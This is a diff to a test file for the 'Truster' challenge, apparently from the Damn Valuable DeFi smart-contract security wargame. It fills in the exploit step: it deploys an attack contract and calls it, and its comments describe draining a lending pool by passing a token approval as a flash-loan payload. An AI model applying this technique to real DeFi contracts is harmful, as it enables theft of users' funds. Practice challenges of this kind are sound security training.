@@ -15,6 +15,7 @@ describe('[Challenge] Truster', function () {
 
         this.token = await DamnValuableToken.deploy();
         this.pool = await TrusterLenderPool.deploy(this.token.address);
+        
 
         await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
 
@@ -28,7 +29,16 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE  */
+
+        // deploy attacking contract from attacker address
+        const AttackContract = await ethers.getContractFactory('AttackContract', attacker);
+        this.attacker = await AttackContract.deploy();
+
+        // call attack function of attacker contract
+        // sends token approval as payload when calling the flash loan function
+        // then transfers the token to the attack contract owner / message sender
+        await this.attacker.attack(this.token.address, this.pool.address)
+
     });
 
     after(async function () {
